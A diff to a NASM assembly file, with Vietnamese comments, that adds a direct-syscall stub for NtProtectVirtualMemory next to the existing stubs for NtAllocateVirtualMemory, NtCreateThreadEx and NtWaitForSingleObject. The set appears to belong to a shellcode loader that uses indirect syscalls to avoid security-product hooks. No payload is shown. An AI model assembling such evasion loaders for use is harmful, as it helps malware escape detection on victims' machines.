@@ -3,12 +3,14 @@
 ; Khai báo các biến toàn cục mà file C++ sẽ cung cấp
 extern g_syscall_addr
 extern g_ssn_NtAllocateVirtualMemory
+extern g_ssn_NtProtectVirtualMemory
 extern g_ssn_NtCreateThreadEx
 extern g_ssn_NtWaitForSingleObject
 ; ...
 
 ; Khai báo các hàm để C++ có thể gọi
 global sysNtAllocateVirtualMemory
+global sysNtProtectVirtualMemory
 global sysNtCreateThreadEx
 global sysNtWaitForSingleObject
 ; ...
@@ -18,6 +20,12 @@ section .text
 sysNtAllocateVirtualMemory:
     mov r10, rcx
     mov eax, dword [rel g_ssn_NtAllocateVirtualMemory]
+    jmp qword [rel g_syscall_addr]
+    ret
+
+sysNtProtectVirtualMemory:
+    mov r10, rcx
+    mov eax, dword [rel g_ssn_NtProtectVirtualMemory]
     jmp qword [rel g_syscall_addr]
     ret
 
